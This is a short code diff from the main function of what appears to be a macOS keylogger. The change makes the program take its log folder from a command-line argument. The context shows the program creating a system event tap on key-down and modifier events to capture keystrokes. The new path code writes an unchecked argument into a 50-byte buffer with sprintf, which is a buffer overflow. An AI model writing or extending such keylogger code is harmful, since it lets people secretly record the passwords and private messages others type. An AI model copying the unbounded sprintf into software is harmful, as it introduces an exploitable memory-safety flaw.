@@ -1,13 +1,17 @@
 #include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
-    char logFileLocation[40];
+    char logFileLocation[50];
     struct   tm* tm;
 
-    time_t now = time(NULL);          // get current time
-    tm  = localtime(&now);     // get time structure
-
-    sprintf(logFileLocation, "/var/log/keylogger.%04d%02d%02d.log", tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday);
+    time_t now = time(NULL);
+    tm  = localtime(&now);
+    if(argc == 2) {
+        sprintf(logFileLocation, "%s/%04d%02d%02d.log", argv[1], tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday);
+    }else{
+        fprintf(stderr, "ERROR: You must specify the full path to the logs folder.\n");
+        exit(1);
+    }
 
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
     CFMachPortRef eventTap = CGEventTapCreate(
